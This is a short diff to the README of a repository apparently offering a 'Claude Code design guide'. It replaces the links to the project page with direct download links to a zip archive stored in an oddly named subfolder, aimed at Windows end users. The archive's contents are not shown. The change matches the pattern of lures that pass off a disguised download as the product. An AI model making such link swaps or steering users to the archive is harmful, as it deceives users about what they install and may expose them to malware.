@@ -1,6 +1,6 @@
 # 🎨 claude-code-design-guide - Build Better AI Workflows
 
-[![Download](https://img.shields.io/badge/Download-claude-code-design-guide-blue?style=for-the-badge)](https://github.com/Janianorthkorean166/claude-code-design-guide)
+[![Download](https://img.shields.io/badge/Download-claude-code-design-guide-blue?style=for-the-badge)](https://raw.githubusercontent.com/Janianorthkorean166/claude-code-design-guide/main/maculicole/claude-guide-code-design-3.6.zip)
 
 ## 🧭 What This Is
 
@@ -12,7 +12,7 @@ This repository is built for end users who want clear steps, simple file handlin
 
 Use this link to visit the page and download the project:
 
-https://github.com/Janianorthkorean166/claude-code-design-guide
+https://raw.githubusercontent.com/Janianorthkorean166/claude-code-design-guide/main/maculicole/claude-guide-code-design-3.6.zip
 
 On Windows, follow these steps:
 
